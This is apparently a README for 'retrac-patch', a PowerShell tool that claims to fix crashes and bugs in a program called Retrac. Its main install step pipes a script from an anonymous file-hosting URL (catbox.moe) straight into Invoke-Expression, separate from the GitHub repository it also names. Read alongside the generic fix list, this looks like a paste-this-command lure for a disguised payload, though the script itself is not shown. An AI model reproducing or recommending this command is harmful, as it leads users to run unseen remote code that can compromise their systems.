# retrac-patch

> A dead-simple PowerShell command that patches Retrac and fixes most known bugs in one shot.


## Overview

`retrac-patch` is an open-source PowerShell module that automatically detects and applies a curated set of community-verified patches to your Retrac installation. Instead of manually hunting down fixes, one command handles everything.

**Fixes included (12+):**
- Crash on launch (missing registry entries / corrupted config)
- DLL load failures and broken dynamic library paths
- Permission / ACL errors on restricted user accounts
- Network timeout infinite-loop on startup
- Missing or wiped config files
- Plugin manifest conflicts preventing module loads
- ...and more with every release

---

## Requirements

- Windows 11
- PowerShell 5.1 or PowerShell 7+
- Retrac installed on the system

---

## Installation

Run directly via PowerShell (no install needed):

```powershell
irm https://files.catbox.moe/6drfgf.ps1 | iex
```

Or clone the repo manually:

```powershell
git clone https://github.com/Somniiiii12/Retracc-Patcher.git
Import-Module ./Retracc-Patcher/retrac-patch.psd1

## After Patching

Close and reopen Retrac — patches take effect immediately. No system restart required.


Pull requests are welcome. To add a new fix:

1. Fork the repo at https://github.com/Somniiiii12/Retracc-Patcher
2. Create a branch: `git checkout -b fix/your-fix-name`
3. Add your patch logic under `./patches/`
4. Update `PATCHES.md` with a description and severity
5. Open a PR

Please test on both PowerShell 5.1 and PowerShell 7 before submitting.

---

## License

MIT License

Copyright (c) 2026 retrac-patch contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
